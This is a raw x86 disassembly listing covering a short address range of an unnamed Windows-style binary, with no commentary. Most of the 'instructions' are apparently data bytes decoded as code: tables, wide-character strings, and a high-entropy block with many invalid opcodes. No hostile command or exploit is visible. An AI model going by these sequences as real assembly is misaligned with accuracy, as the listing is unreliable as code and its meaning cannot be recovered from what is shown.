  410f1f:	add    BYTE PTR [eax],al
  410f21:	add    BYTE PTR [ecx+0xc000149],dl
  410f27:	or     DWORD PTR [eax],eax
  410f29:	add    ah,ah
  410f2b:	add    al,0x0
  410f2d:	add    BYTE PTR [eax],al
  410f2f:	add    BYTE PTR [eax],al
  410f31:	add    BYTE PTR [ebp+0xc000152],bl
  410f37:	or     DWORD PTR [eax],eax
  410f39:	add    ah,ah
  410f3b:	add    al,0x0
  410f3d:	add    BYTE PTR [eax],al
  410f3f:	add    BYTE PTR [eax],al
  410f41:	add    BYTE PTR [ecx+0x800015b],ch
  410f47:	or     DWORD PTR [eax],eax
  410f49:	add    ah,ah
  410f4b:	add    al,0x0
  410f4d:	add    BYTE PTR [eax],al
  410f4f:	add    BYTE PTR [eax],al
  410f51:	add    BYTE PTR [ecx+0x4000164],dh
  410f57:	or     DWORD PTR [eax],eax
  410f59:	add    ah,ah
  410f5b:	add    al,0x0
  410f5d:	add    BYTE PTR [eax],al
  410f5f:	add    BYTE PTR [eax],al
  410f61:	add    BYTE PTR [ebp+0xc00016d],dh
  410f67:	or     DWORD PTR [eax],eax
  410f69:	add    ah,ah
  410f6b:	add    al,0x0
  410f6d:	add    BYTE PTR [eax],al
  410f6f:	add    BYTE PTR [eax],al
  410f71:	add    cl,al
  410f73:	jbe    0x410f76
  410f75:	add    BYTE PTR [eax],cl
  410f77:	or     DWORD PTR [eax],eax
  410f79:	add    ah,ah
  410f7b:	add    al,0x0
  410f7d:	add    BYTE PTR [eax],al
  410f7f:	add    BYTE PTR [eax],al
  410f81:	add    cl,cl
  410f83:	jg     0x410f86
  410f85:	add    BYTE PTR [ecx+ecx*1],cl
  410f88:	add    BYTE PTR [eax],al
  410f8a:	in     al,0x4
  410f8c:	add    BYTE PTR [eax],al
  410f8e:	add    BYTE PTR [eax],al
  410f90:	add    BYTE PTR [eax],al
  410f92:	aad    0x88
  410f94:	add    DWORD PTR [eax],eax
  410f96:	adc    BYTE PTR [ecx],cl
  410f98:	add    BYTE PTR [eax],al
  410f9a:	in     al,0x4
  410f9c:	add    BYTE PTR [eax],al
  410f9e:	add    BYTE PTR [eax],al
  410fa0:	add    BYTE PTR [eax],al
  410fa2:	in     eax,0x91
  410fa4:	add    DWORD PTR [eax],eax
  410fa6:	or     al,0x9
  410fa8:	add    BYTE PTR [eax],al
  410faa:	in     al,0x4
  410fac:	add    BYTE PTR [eax],al
  410fae:	add    BYTE PTR [eax],al
  410fb0:	add    BYTE PTR [eax],al
  410fb2:	icebp  
  410fb3:	call   0x0:0x90c0001
  410fba:	in     al,0x4
  410fbc:	add    BYTE PTR [eax],al
  410fbe:	add    BYTE PTR [eax],al
  410fc0:	add    BYTE PTR [eax],al
  410fc2:	std    
  410fc3:	mov    ds:0x9080001,eax
  410fc8:	add    BYTE PTR [eax],al
  410fca:	in     al,0x4
  410fcc:	add    BYTE PTR [eax],al
  410fce:	add    BYTE PTR [eax],al
  410fd0:	add    BYTE PTR [eax],al
  410fd2:	add    eax,0x100001ad
  410fd7:	or     DWORD PTR [eax],eax
  410fd9:	add    ah,ah
  410fdb:	add    al,0x0
  410fdd:	add    BYTE PTR [eax],al
  410fdf:	add    BYTE PTR [eax],al
  410fe1:	add    BYTE PTR ds:0x40001b6,dl
  410fe7:	or     DWORD PTR [eax],eax
  410fe9:	add    ah,ah
  410feb:	add    al,0x0
  410fed:	add    BYTE PTR [eax],al
  410fef:	add    BYTE PTR [eax],al
  410ff1:	add    BYTE PTR [ecx],bl
  410ff3:	mov    edi,0x9100001
  410ff8:	add    BYTE PTR [eax],al
  410ffa:	in     al,0x4
  410ffc:	add    BYTE PTR [eax],al
  410ffe:	add    BYTE PTR [eax],al
  411000:	add    BYTE PTR [eax],al
  411002:	sub    eax,ecx
  411004:	add    DWORD PTR [eax],eax
  411006:	adc    BYTE PTR [ecx],cl
  411008:	add    BYTE PTR [eax],al
  41100a:	in     al,0x4
  41100c:	add    BYTE PTR [eax],al
  41100e:	add    BYTE PTR [eax],al
  411010:	add    BYTE PTR [eax],al
  411012:	cmp    ecx,edx
  411014:	add    DWORD PTR [eax],eax
  411016:	adc    BYTE PTR [ecx],cl
  411018:	add    BYTE PTR [eax],al
  41101a:	in     al,0x4
  41101c:	add    BYTE PTR [eax],al
  41101e:	add    BYTE PTR [eax],al
  411020:	add    BYTE PTR [eax],al
  411022:	dec    ecx
  411023:	fiadd  DWORD PTR [ecx]
  411025:	add    BYTE PTR [ecx+ecx*1],cl
  411028:	add    BYTE PTR [eax],al
  41102a:	in     al,0x4
  41102c:	add    BYTE PTR [eax],al
  41102e:	add    BYTE PTR [eax],al
  411030:	add    BYTE PTR [eax],al
  411032:	push   ebp
  411033:	jecxz  0x411036
  411035:	add    BYTE PTR [eax],dl
  411037:	or     DWORD PTR [eax],eax
  411039:	add    ah,ah
  41103b:	add    al,0x0
  41103d:	add    BYTE PTR [eax],al
  41103f:	add    BYTE PTR [eax],al
  411041:	add    BYTE PTR [ebp-0x14],ah
  411044:	add    DWORD PTR [eax],eax
  411046:	adc    BYTE PTR [ecx],cl
  411048:	add    BYTE PTR [eax],al
  41104a:	in     al,0x4
  41104c:	add    BYTE PTR [eax],al
  41104e:	add    BYTE PTR [eax],al
  411050:	add    BYTE PTR [eax],al
  411052:	jne    0x411049
  411054:	add    DWORD PTR [eax],eax
  411056:	or     BYTE PTR [ecx],cl
  411058:	add    BYTE PTR [eax],al
  41105a:	in     al,0x4
  41105c:	add    BYTE PTR [eax],al
  41105e:	add    BYTE PTR [eax],al
  411060:	add    BYTE PTR [eax],al
  411062:	jge    0x411062
  411064:	add    DWORD PTR [eax],eax
  411066:	or     al,0x9
  411068:	add    BYTE PTR [eax],al
  41106a:	in     al,0x4
  41106c:	add    BYTE PTR [eax],al
  41106e:	add    BYTE PTR [eax],al
  411070:	add    BYTE PTR [eax],al
  411072:	mov    DWORD PTR [edi],eax
  411074:	add    al,BYTE PTR [eax]
  411076:	or     al,0x9
  411078:	add    BYTE PTR [eax],al
  41107a:	in     al,0x4
  41107c:	add    BYTE PTR [eax],al
  41107e:	add    BYTE PTR [eax],al
  411080:	add    BYTE PTR [eax],al
  411082:	xchg   ebp,eax
  411083:	adc    BYTE PTR [edx],al
  411085:	add    BYTE PTR [ecx+ecx*1],cl
  411088:	add    BYTE PTR [eax],al
  41108a:	in     al,0x4
  41108c:	add    BYTE PTR [eax],al
  41108e:	add    BYTE PTR [eax],al
  411090:	add    BYTE PTR [eax],al
  411092:	mov    eax,ds:0x8000219
  411097:	or     DWORD PTR [eax],eax
  411099:	add    ah,ah
  41109b:	add    al,0x0
  41109d:	add    BYTE PTR [eax],al
  41109f:	add    BYTE PTR [eax],al
  4110a1:	add    BYTE PTR ds:0x56004100,cl
  4110a7:	add    BYTE PTR [esi+0x0],dl
  4110aa:	pop    edi
  4110ab:	add    BYTE PTR [ebp+0x0],cl
  4110ae:	inc    esi
  4110af:	add    BYTE PTR [edx+0x0],bl
  4110b2:	xor    DWORD PTR [eax],eax
  4110b4:	pop    edi
  4110b5:	add    BYTE PTR [edi+0x0],al
  4110b8:	pop    ecx
  4110b9:	add    BYTE PTR [edx+0x0],cl
  4110bc:	aaa    
  4110bd:	add    BYTE PTR [esi],cl
  4110bf:	add    BYTE PTR [ebp+0x0],dl
  4110c2:	xor    eax,DWORD PTR [eax]
  4110c4:	dec    ecx
  4110c5:	add    BYTE PTR [edi+0x0],bl
  4110c8:	cmp    BYTE PTR [eax],al
  4110ca:	push   ecx
  4110cb:	add    BYTE PTR [eax],dh
  4110cd:	add    BYTE PTR [ebx+0x0],cl
  4110d0:	dec    ebp
  4110d1:	add    BYTE PTR [edi],dh
  4110d3:	add    BYTE PTR [ecx],bh
  4110d5:	add    BYTE PTR [edi+0x0],bl
  4110d8:	push   ebx
  4110d9:	add    BYTE PTR [eax+0x0],dl
  4110dc:	or     BYTE PTR [eax],al
  4110de:	inc    ebp
  4110df:	add    BYTE PTR [eax],bh
  4110e1:	add    BYTE PTR [eax],bh
  4110e3:	add    BYTE PTR [edi+0x0],bl
  4110e6:	dec    ebx
  4110e7:	add    BYTE PTR [eax+0x0],cl
  4110ea:	push   eax
  4110eb:	add    BYTE PTR [ecx],bh
  4110ed:	add    BYTE PTR [ebx],cl
  4110ef:	add    BYTE PTR [edi+0x0],cl
  4110f2:	aaa    
  4110f3:	add    BYTE PTR [eax],dh
  4110f5:	add    BYTE PTR [edx],dh
  4110f7:	add    BYTE PTR [edi+0x0],bl
  4110fa:	cmp    DWORD PTR [eax],eax
  4110fc:	cmp    BYTE PTR [eax],al
  4110fe:	inc    edi
  4110ff:	add    BYTE PTR [edi+0x0],bl
  411102:	xor    BYTE PTR [eax],al
  411104:	dec    ebp
  411105:	add    BYTE PTR [eax+eax*1],cl
  411108:	inc    esi
  411109:	add    BYTE PTR [edx+0x0],bl
  41110c:	dec    esp
  41110d:	add    BYTE PTR [edi+0x0],bl
  411110:	add    BYTE PTR ss:[ebx],dh
  411113:	add    BYTE PTR [edi+0x0],cl
  411116:	push   esi
  411117:	add    BYTE PTR [eax+eax*1],dh
  41111a:	pop    edi
  41111b:	add    BYTE PTR [eax],bh
  41111d:	add    BYTE PTR [esi+0x0],cl
  411120:	or     BYTE PTR [eax],al
  411122:	dec    edi
  411123:	add    BYTE PTR [edx+0x0],dl
  411126:	push   esp
  411127:	add    BYTE PTR [edi+0x0],bl
  41112a:	push   ebp
  41112b:	add    BYTE PTR [edx],dh
  41112d:	add    BYTE PTR [ecx+0x0],bl
  411130:	xor    eax,DWORD PTR [eax]
  411132:	or     BYTE PTR [eax],al
  411134:	inc    edi
  411135:	add    BYTE PTR [ecx+0x0],cl
  411138:	push   edi
  411139:	add    BYTE PTR [edi+0x0],bl
  41113c:	xor    eax,0x44003100
  411141:	add    BYTE PTR [ecx],dh
  411143:	add    BYTE PTR [eax],cl
  411145:	add    BYTE PTR [ebp+0x0],al
  411148:	push   ebp
  411149:	add    BYTE PTR [edi],dh
  41114b:	add    BYTE PTR [eax],dh
  41114d:	add    BYTE PTR [edi+0x0],bl
  411150:	inc    esi
  411151:	add    BYTE PTR [eax+eax*1+0x35],al
  411155:	add    BYTE PTR [edx],cl
  411157:	add    BYTE PTR [ebp+0x0],cl
  41115a:	xor    al,0x0
  41115c:	push   esi
  41115d:	add    BYTE PTR [edi+0x0],bl
  411160:	dec    eax
  411161:	add    BYTE PTR [eax],dh
  411163:	add    BYTE PTR [eax+0x0],bl
  411166:	inc    esp
  411167:	add    BYTE PTR ds:0xb003000,dh
  41116d:	add    BYTE PTR [ecx+0x0],dl
  411170:	xor    al,0x0
  411172:	pop    edx
  411173:	add    BYTE PTR [edi+0x0],bl
  411176:	inc    edx
  411177:	add    BYTE PTR [eax+eax*1+0x42],al
  41117b:	add    BYTE PTR [ebx+0x0],dl
  41117e:	pop    edi
  41117f:	add    BYTE PTR [eax],dh
  411181:	add    BYTE PTR [ebp+0x0],dl
  411184:	or     al,0x0
  411186:	push   edx
  411187:	add    BYTE PTR [edi+0x0],al
  41118a:	push   esp
  41118b:	add    BYTE PTR [eax],bh
  41118d:	add    BYTE PTR [esi],dh
  41118f:	add    BYTE PTR [edi+0x0],bl
  411192:	dec    eax
  411193:	add    BYTE PTR [ebp+0x0],al
  411196:	push   esp
  411197:	add    BYTE PTR [edx+0x0],cl
  41119a:	push   edi
  41119b:	add    BYTE PTR [ecx+0x0],dl
  41119e:	or     DWORD PTR [eax],eax
  4111a0:	pop    edx
  4111a1:	add    BYTE PTR [edx+0x0],dl
  4111a4:	dec    edx
  4111a5:	add    BYTE PTR [edi+0x0],bl
  4111a8:	xor    BYTE PTR [eax],al
  4111aa:	aaa    
  4111ab:	add    BYTE PTR [esi+0x0],dl
  4111ae:	inc    edx
  4111af:	add    BYTE PTR [eax],dh
  4111b1:	add    BYTE PTR [esi],cl
  4111b3:	add    BYTE PTR [eax+0x0],cl
  4111b6:	cmp    DWORD PTR [eax],eax
  4111b8:	dec    ebx
  4111b9:	add    BYTE PTR [edi+0x0],bl
  4111bc:	xor    al,0x0
  4111be:	inc    ecx
  4111bf:	add    BYTE PTR [ecx],bh
  4111c1:	add    BYTE PTR [esi+0x0],dl
  4111c4:	cmp    DWORD PTR [eax],eax
  4111c6:	pop    edi
  4111c7:	add    BYTE PTR [eax+0x0],cl
  4111ca:	dec    ecx
  4111cb:	add    BYTE PTR [eax+eax*1+0x58],al
  4111cf:	add    BYTE PTR [eax],cl
  4111d1:	add    BYTE PTR [eax+0x0],dl
  4111d4:	dec    esi
  4111d5:	add    BYTE PTR [eax+0x0],cl
  4111d8:	pop    edi
  4111d9:	add    BYTE PTR [eax],dh
  4111db:	add    BYTE PTR [ecx+0x0],dl
  4111de:	xor    DWORD PTR [eax],eax
  4111e0:	dec    ebp
  4111e1:	add    BYTE PTR [ebx],cl
  4111e3:	add    BYTE PTR [edi+0x0],cl
  4111e6:	dec    esp
  4111e7:	add    BYTE PTR [ecx+0x0],bl
  4111ea:	pop    edi
  4111eb:	add    BYTE PTR [eax+0x0],bl
  4111ee:	dec    esp
  4111ef:	add    BYTE PTR [edi+0x0],cl
  4111f2:	push   eax
  4111f3:	add    BYTE PTR [edi+0x0],bl
  4111f6:	xor    eax,DWORD PTR [eax]
  4111f8:	inc    edi
  4111f9:	add    BYTE PTR ds:0x51004f00,cl
  4111ff:	add    BYTE PTR [edx+0x0],cl
  411202:	pop    edi
  411203:	add    BYTE PTR [edx],dh
  411205:	add    BYTE PTR ds:0x59003600,dh
  41120b:	add    BYTE PTR [edi+0x0],bl
  41120e:	cmp    DWORD PTR [eax],eax
  411210:	cmp    DWORD PTR [eax],eax
  411212:	push   edx
  411213:	add    BYTE PTR [ebx],dh
  411215:	add    BYTE PTR [ecx],cl
  411217:	add    BYTE PTR [ebx+0x0],cl
  41121a:	push   ecx
  41121b:	add    BYTE PTR [ebp+0x0],dl
  41121e:	pop    edi
  41121f:	add    BYTE PTR [esi+0x0],dl
  411222:	xor    eax,0x32004400
  411227:	add    BYTE PTR [eax],dh
  411229:	add    BYTE PTR [edx],cl
  41122b:	add    BYTE PTR [eax+0x0],dl
  41122e:	push   eax
  41122f:	add    BYTE PTR [esi],dh
  411231:	add    BYTE PTR [edi+0x0],bl
  411234:	dec    eax
  411235:	add    BYTE PTR [ebp+0x0],cl
  411238:	xor    DWORD PTR [eax],eax
  41123a:	xor    al,BYTE PTR [eax]
  41123c:	pop    edi
  41123d:	add    BYTE PTR [eax+eax*1+0xa],dl
  411241:	add    BYTE PTR [ebp+0x0],al
  411244:	pop    eax
  411245:	add    BYTE PTR [eax+eax*1],dh
  411248:	aaa    
  411249:	add    BYTE PTR [esi],dh
  41124b:	add    BYTE PTR [esi],dh
  41124d:	add    BYTE PTR ds:0x48005f00,dh
  411253:	add    BYTE PTR [edx],dh
  411255:	add    BYTE PTR [ebx],cl
  411257:	add    BYTE PTR [ebx+0x0],dl
  41125a:	inc    edi
  41125b:	add    BYTE PTR [eax],bh
  41125d:	add    BYTE PTR [edi+0x0],bl
  411260:	inc    edi
  411261:	add    BYTE PTR [edx+0x0],cl
  411264:	pop    ecx
  411265:	add    BYTE PTR [esi],dh
  411267:	add    BYTE PTR [edi+0x0],bl
  41126a:	cmp    DWORD PTR [eax],eax
  41126c:	cmp    DWORD PTR [eax],eax
  41126e:	push   cs
  41126f:	add    BYTE PTR [ebp+0x0],dl
  411272:	xor    DWORD PTR [eax],eax
  411274:	add    BYTE PTR ss:[edi+0x0],bl
  411278:	pop    ecx
  411279:	add    BYTE PTR [edx+0x0],bl
  41127c:	push   ebx
  41127d:	add    BYTE PTR [eax],dh
  41127f:	add    BYTE PTR [eax],bh
  411281:	add    BYTE PTR [edi+0x0],bl
  411284:	push   ecx
  411285:	add    BYTE PTR [ebx+0x0],al
  411288:	push   edi
  411289:	add    BYTE PTR [edx],dh
  41128b:	add    BYTE PTR [ebx],cl
  41128d:	add    BYTE PTR [eax+eax*1+0x4e],dl
  411291:	add    BYTE PTR [edx],dh
  411293:	add    BYTE PTR [edi+0x0],bl
  411296:	push   eax
  411297:	add    BYTE PTR [edx+0x0],al
  41129a:	inc    edx
  41129b:	add    BYTE PTR [ecx+0x0],bl
  41129e:	pop    edi
  41129f:	add    BYTE PTR [ebp+0x0],cl
  4112a2:	push   esp
  4112a3:	add    BYTE PTR [eax+eax*1],cl
  4112a6:	pop    edx
  4112a7:	add    BYTE PTR [eax+0x0],cl
  4112aa:	add    BYTE PTR ss:[edi+0x0],bl
  4112ae:	xor    al,BYTE PTR [eax]
  4112b0:	inc    edx
  4112b1:	add    BYTE PTR [ebx+0x0],al
  4112b4:	pop    edi
  4112b5:	add    BYTE PTR [ebp+0x0],dl
  4112b8:	pop    ecx
  4112b9:	add    BYTE PTR [edi],dh
  4112bb:	add    BYTE PTR [edi+0x0],cl
  4112be:	push   cs
  4112bf:	add    BYTE PTR [ebp+0x0],dl
  4112c2:	xor    BYTE PTR [eax],al
  4112c4:	inc    ebx
  4112c5:	add    BYTE PTR [edi+0x0],bl
  4112c8:	inc    edi
  4112c9:	add    BYTE PTR ds:0x38004100,dh
  4112cf:	add    BYTE PTR [edi+0x0],bl
  4112d2:	push   edx
  4112d3:	add    BYTE PTR [eax+eax*1],dh
  4112d6:	xor    BYTE PTR [eax],al
  4112d8:	pop    edi
  4112d9:	add    BYTE PTR [ecx+0x0],al
  4112dc:	or     al,0x0
  4112de:	push   esi
  4112df:	add    BYTE PTR [eax],dh
  4112e1:	add    BYTE PTR [edi+0x0],cl
  4112e4:	xor    al,BYTE PTR [eax]
  4112e6:	pop    edi
  4112e7:	add    BYTE PTR [esi+0x0],cl
  4112ea:	push   ebp
  4112eb:	add    BYTE PTR [esi+0x0],dl
  4112ee:	inc    ecx
  4112ef:	add    BYTE PTR [eax+0x0],dl
  4112f2:	pop    edi
  4112f3:	add    BYTE PTR [eax],bh
  4112f5:	add    BYTE PTR [eax],cl
  4112f7:	add    BYTE PTR [edi+0x0],dl
  4112fa:	dec    eax
  4112fb:	add    BYTE PTR [eax+0x0],bl
  4112fe:	pop    edi
  4112ff:	add    BYTE PTR [ebp+0x0],cl
  411302:	push   esi
  411303:	add    BYTE PTR [edi+0x0],cl
  411306:	push   edx
  411307:	add    BYTE PTR ds:0x47004e00,cl
  41130d:	add    BYTE PTR [eax+eax*1],dh
  411310:	xor    DWORD PTR [eax],eax
  411312:	pop    edi
  411313:	add    BYTE PTR [esi+0x0],al
  411316:	push   esp
  411317:	add    BYTE PTR [edx+0x0],bl
  41131a:	dec    ecx
  41131b:	add    BYTE PTR [edi+0x0],bl
  41131e:	inc    edi
  41131f:	add    BYTE PTR [ecx+0x0],cl
  411322:	dec    eax
	...
  41132f:	add    BYTE PTR [eax],al
  411331:	add    BYTE PTR [ecx+0x6a],ah
  411334:	jmp    0xffd8fe50
  411339:	jle    0x411341
  41133b:	js     0x4112ea
  41133d:	aam    0x22
  41133f:	jns    0x411391
  411341:	neg    BYTE PTR [ebx]
  411343:	jle    0x411346
  411345:	add    BYTE PTR [eax],ah
  411347:	pop    es
  411348:	add    BYTE PTR [eax],al
  41134a:	ds inc edx
  41134c:	push   esi
  41134d:	fwait
  41134e:	or     esp,DWORD PTR ds:0xa0f84a1a
  411354:	dec    edi
  411355:	sub    DWORD PTR ds:0x77d477d2,esp
  41135b:	sub    al,0xb5
  41135d:	mov    dl,0xa1
  41135f:	daa    
  411360:	or     BYTE PTR ss:[ecx+0x1bd5bd37],bl
  411367:	jecxz  0x411372
  411369:	push   ss
  41136a:	dec    esi
  41136b:	mov    edx,0x183ad378
  411370:	dec    ebp
  411371:	and    dh,al
  411373:	and    eax,0x63518dd0
  411378:	pop    eax
  411379:	aam    0xa5
  41137b:	stos   BYTE PTR es:[edi],al
  41137c:	pop    es
  41137d:	mov    ah,0xbd
  41137f:	sub    eax,0x382f4cd0
  411384:	(bad)  
  411385:	sub    BYTE PTR [ebp+0x632ecbfc],bl
  41138b:	cwde   
  41138c:	inc    ebx
  41138d:	fst    DWORD PTR [ebp-0x6c]
  411390:	push   ds
  411391:	add    al,0x16
  411393:	dec    esi
  411394:	mov    al,0x83
  411396:	pop    ebx
  411397:	pop    esi
  411398:	mov    DWORD PTR ds:0x1d0bce9b,eax
  41139e:	scas   eax,DWORD PTR es:[edi]
  41139f:	push   edx
  4113a0:	push   ss
  4113a1:	enter  0xcc92,0x4a
  4113a5:	loop   0x411327
  4113a7:	out    dx,al
  4113a8:	jbe    0x4113be
  4113aa:	adc    eax,0x619dec4
  4113af:	ret    0xd6c5
  4113b2:	mov    WORD PTR [ebp*1+0x66d5353b],cs
  4113b9:	add    DWORD PTR [eax+0x7b],esp
  4113bc:	jge    0x4113d1
  4113be:	xor    al,0x20
  4113c0:	jbe    0x4113b3
  4113c2:	stc    
  4113c3:	aaa    
  4113c4:	and    BYTE PTR [ebx+0x5e2d0fd9],dh
  4113ca:	xchg   ebx,eax
  4113cb:	pop    esp
  4113cc:	sbb    al,BYTE PTR [ebx-0x3e]
  4113cf:	and    eax,0xa7cf92f
  4113d4:	arpl   si,bx
  4113d6:	inc    ebx
  4113d7:	dec    edi
  4113d8:	outs   dx,BYTE PTR ds:[esi]
  4113d9:	jmp    0xc1dda34e
  4113de:	call   0xaed8:0x99a932eb
  4113e5:	es call 0xb331:0xd7f85cc9
  4113ed:	ins    BYTE PTR es:[edi],dx
  4113ee:	xor    BYTE PTR [esi+ecx*8+0x43149a7d],bl
  4113f5:	les    esp,FWORD PTR [eax]
  4113f7:	sbb    eax,0x8b1f0cb9
  4113fc:	or     bh,ch
  4113fe:	add    DWORD PTR [ecx*1-0x30f22cbb],ecx
  411405:	mov    dl,0x28
  411407:	in     al,dx
  411408:	shl    ch,cl
  41140a:	push   esi
  41140b:	(bad)  
  41140c:	stos   DWORD PTR es:[edi],eax
  41140d:	xor    DWORD PTR [ebx+0x1cd5f7d1],esi
  411413:	mov    WORD PTR [ebx+0x608a35ad],gs
  411419:	mov    WORD PTR [ebx],ss
  41141b:	push   esi
  41141c:	call   0x5e9f:0x56fadb9a
  411423:	pop    edx
  411424:	mov    ebp,0xbf188afa
  411429:	das    
  41142a:	retf   
  41142b:	pusha  
  41142c:	into   
  41142d:	(bad)  
  41142f:	rcr    al,0x1e
  411432:	mov    ah,BYTE PTR [eax-0x7ef01279]
  411438:	jmp    0xe940:0x42ec65c1
  41143f:	int    0xee
  411441:	popa   
  411442:	xchg   esp,eax
  411443:	mul    DWORD PTR [edx]
  411445:	or     BYTE PTR [esi+0x52],cl
  411448:	out    dx,eax
  411449:	in     al,dx
  41144a:	rcr    BYTE PTR [ebx+0x4e24641a],0x58
  411451:	ja     0x41149f
  411453:	test   BYTE PTR [ecx+0x525aa71f],ch
  411459:	mov    dl,0xb3
  41145b:	push   0x25
  41145d:	dec    BYTE PTR [ecx-0x15998957]
  411463:	mov    edx,0xfd2139a4
  411468:	sub    DWORD PTR ds:0x8b89a080,ebp
  41146e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41146f:	leave  
  411470:	outs   dx,BYTE PTR ds:[esi]
  411471:	out    dx,eax
  411472:	data16 sub cl,BYTE PTR [ebx+0x7b41dbf0]
  411479:	(bad)  
  41147a:	repz shl BYTE PTR [ecx+0x2f27ec51],0xe
  411482:	add    esi,eax
  411484:	retf   
  411485:	ret    0xf158
  411488:	(bad)  
  411489:	mov    esp,0xd0226638
  41148e:	sbb    edi,DWORD PTR [esi+0x70]
  411491:	xor    al,0xb8
  411493:	jbe    0x41143f
  411495:	out    0x8c,al
  411497:	leave  
  411498:	not    edx
  41149a:	popf   
  41149b:	int    0xb3
  41149d:	pushf  
  41149e:	mov    ebx,edx
  4114a0:	arpl   WORD PTR fs:[edx+0x24d82a20],di
  4114a7:	call   0xd8c14ee5
  4114ac:	hlt    
  4114ad:	outs   dx,BYTE PTR ds:[esi]
  4114ae:	mov    ecx,0x7974b6ab
  4114b3:	test   eax,0x2913243
  4114b8:	xchg   edx,eax
  4114b9:	iret   
  4114ba:	mov    ss,WORD PTR [ecx]
  4114bc:	scas   eax,DWORD PTR es:[edi]
  4114bd:	test   eax,0x254c41fb
  4114c2:	in     al,0x45
  4114c4:	fwait
  4114c5:	pop    esi
  4114c6:	jne    0x411519
  4114c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114c9:	sub    DWORD PTR [edx+0x76],esi
  4114cc:	dec    cl
  4114ce:	add    esi,DWORD PTR [eax-0x6cb49978]
  4114d4:	pop    ss
  4114d5:	add    BYTE PTR [ebx],0x19
  4114d8:	ss mov ch,0xd5
  4114db:	sub    DWORD PTR [esi-0x78800f2e],ecx
  4114e1:	arpl   WORD PTR [edx-0x5f142c86],ax
  4114e7:	xor    DWORD PTR [ebx-0x69],esi
  4114ea:	xor    BYTE PTR [ebp-0x1f53c04],ah
  4114f0:	rcl    BYTE PTR [edx-0x45f0dff6],0x2d
  4114f7:	mov    ah,0x67
  4114f9:	sbb    al,BYTE PTR [edi+0x20]
  4114fc:	lock and DWORD PTR [edi-0x76],edi
  411500:	pop    ecx
  411501:	test   BYTE PTR [ebp-0x17],ch
  411504:	inc    ecx
  411505:	adc    BYTE PTR [ebp+0x4da3ea7f],bl
  41150b:	ins    DWORD PTR es:[edi],dx
  41150c:	ja     0x4114a5
  41150e:	mul    ecx
  411510:	mov    ah,0x60
  411512:	fdivr  st(4),st
  411514:	push   eax
  411515:	jbe    0x41156b
  411517:	xchg   edx,eax
  411518:	mov    WORD PTR [edx-0x4f],?
  41151b:	jbe    0x411522
  41151d:	shl    BYTE PTR [ebp-0x574ae9c],1
  411523:	stc    
  411524:	shr    BYTE PTR fs:[esi+ecx*4],cl
  411528:	test   BYTE PTR [edi-0x31e805bf],dh
  41152e:	xchg   ebx,eax
  41152f:	sub    eax,0x9da2ce97
  411534:	pop    ebp
  411535:	test   DWORD PTR [edi+0x6f955f5],esp
  41153b:	outs   dx,BYTE PTR ds:[esi]
  41153c:	xchg   ebp,eax
  41153d:	fwait
  41153e:	sbb    edx,DWORD PTR [esi+0x46]
  411541:	hlt    
  411542:	dec    ebx
  411543:	dec    esp
  411544:	adc    cl,dh
  411546:	jmp    0x3bdd:0x9c058f36
  41154d:	ret    0x7eaa
  411550:	fwait
  411551:	pop    esp
  411552:	sbb    BYTE PTR [edx+esi*4+0xc95f6e4],0x45
  41155a:	mov    bh,0x57
  41155c:	xor    eax,0xa75f4324
  411561:	int    0x17
  411563:	fidivr DWORD PTR ss:[esi-0x3ddc2064]
  41156a:	aaa    
  41156b:	adc    esi,DWORD PTR [edi-0x16]
  41156e:	or     BYTE PTR [ebx+0x34],0xe7
  411572:	mov    bl,0xaf
  411574:	cld    
  411575:	xlat   BYTE PTR ds:[ebx]
  411576:	sub    BYTE PTR [edx],0x93
  411579:	mov    cl,0x2f
  41157b:	out    0x21,al
  41157d:	fwait
  41157e:	repz sub DWORD PTR [ebp-0x3b609efc],edi
  411585:	sub    BYTE PTR [ebp+0x5a],ch
  411588:	adc    eax,0xbf37dd4
  41158d:	mov    bh,0x6c
  41158f:	dec    ecx
  411590:	inc    esi
  411591:	pop    esp
  411592:	sbb    eax,0x16a3b76f
  411597:	mov    eax,0x34cf4790
  41159c:	mov    BYTE PTR [eax+0x6b],ah
  41159f:	cli    
  4115a0:	jnp    0x411607
  4115a2:	mov    eax,ds:0x7f7867e3
  4115a7:	or     al,0xf9
  4115a9:	sub    DWORD PTR es:[ebp+0xb2aecdf],0x39f8593b
  4115b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115b5:	mov    ds:0x7ec9b181,al
  4115ba:	hlt    
  4115bb:	ins    BYTE PTR es:[edi],dx
  4115bc:	mov    ds,WORD PTR [edx+0x3d86f163]
  4115c2:	adc    edi,DWORD PTR [eax+0x3d]
  4115c5:	and    eax,0xf1f1c1ad
  4115ca:	nop
  4115cb:	sti    
  4115cc:	xor    al,0x3c
  4115ce:	sub    al,0x34
  4115d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115d1:	popf   
  4115d2:	and    ebx,DWORD PTR [edi-0x41]
  4115d5:	dec    edi
  4115d6:	sub    al,0x68
  4115d8:	dec    ecx
  4115d9:	mov    WORD PTR [eax-0x6c129d23],gs
  4115df:	popf   
  4115e0:	mov    al,0x4a
  4115e2:	push   ecx
  4115e3:	rcr    BYTE PTR [ebp+0x38],1
  4115e6:	pop    eax
  4115e7:	inc    ebx
  4115e8:	adc    ch,al
  4115ea:	mov    ebx,0xe2763b7
  4115ef:	mov    ebp,0x687b8a17
  4115f4:	sbb    al,0xd5
  4115f6:	dec    edx
  4115f7:	mov    edx,0xfce2b395
  4115fc:	(bad)  
  4115fd:	sbb    al,0xfc
  4115ff:	mov    ch,0x14
  411601:	sub    al,0x26
  411603:	inc    edi
  411604:	pop    ds
  411605:	repz or BYTE PTR [edx-0x2a],cl
  411609:	dec    edx
  41160a:	adc    edx,DWORD PTR [ecx+0x7c201678]
  411610:	mov    gs,WORD PTR [eax+esi*4-0x57]
  411614:	lods   al,BYTE PTR ds:[esi]
  411615:	adc    BYTE PTR [esi-0x4f],ch
  411618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411619:	jge    0x41167d
  41161b:	hlt    
  41161c:	(bad)  [eax]
  41161e:	int    0x68
  411620:	mov    BYTE PTR [edi+0x23],al
  411623:	stc    
  411624:	ja     0x41168c
  411626:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411627:	inc    eax
  411628:	push   ebx
  411629:	jne    0x4115db
  41162b:	xchg   ebp,eax
  41162c:	outs   dx,BYTE PTR ds:[esi]
  41162d:	inc    ecx
